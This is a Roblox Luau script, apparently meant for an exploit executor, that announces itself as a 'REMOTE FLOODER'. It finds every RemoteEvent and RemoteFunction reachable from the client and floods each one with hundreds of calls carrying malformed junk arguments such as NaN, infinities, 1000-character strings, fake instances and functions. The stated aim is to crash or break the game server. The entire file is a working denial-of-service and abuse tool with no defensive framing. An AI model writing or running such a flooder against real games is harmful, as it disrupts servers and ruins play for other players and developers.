local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
local RemotesFound = 0
local TotalFires = 0

local function RandomTable()
    local t = {}
    for i = 1, math.random(1, 20) do
        t[math.random(1, 100)] = math.random() > 0.5 and tostring(math.random(1, 1000)) or math.huge
    end
    return t
end

local function RandomCFrame()
    return CFrame.new(
        math.random(-1000, 1000),
        math.random(-1000, 1000),
        math.random(-1000, 1000)
    )
end

local function RandomInstance()
    local types = {"Part", "IntValue", "StringValue", "ObjectValue"}
    local fake = Instance.new(types[math.random(1, #types)])
    if math.random() > 0.5 then
        fake.Name = "EXPLOIT_"..tostring(math.random(1, 10000))
    end
    return fake
end

local JunkArgs = {
    {nil},
    {math.huge, -math.huge, 0, 1/0, 0/0},
    {"EXPLOIT_STRING", string.rep("A", 1000), ""},
    {RandomTable()},
    {Vector3.new(math.random(), math.random(), math.random())},
    {RandomCFrame()},
    {RandomInstance()},
    {true, false, nil},
    {LocalPlayer, workspace, game},
    {function() return math.random() end}
}

local function FloodRemote(remote)
    for i = 1, 100 do
        for _, args in ipairs(JunkArgs) do
            task.spawn(function()
                pcall(function()
                    remote:FireServer(unpack(args))
                    TotalFires += 1
                end)
            end)
            task.wait()
        end
    end
end

local function FindAndFlood(parent)
    for _, child in ipairs(parent:GetDescendants()) do
        if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
            RemotesFound += 1
            task.spawn(FloodRemote, child)
        end
    end
end

FindAndFlood(ReplicatedStorage)
FindAndFlood(workspace)
FindAndFlood(game:GetService("Lighting"))
FindAndFlood(LocalPlayer)

task.spawn(function()
    while task.wait(1) do
        print(`🔥 Remotes Found: {RemotesFound} | Fires Sent: {TotalFires}`)
    end
end)

print("💣 REMOTE FLOODER ACTIVATED - SERVER DOOM INCOMING 💣")
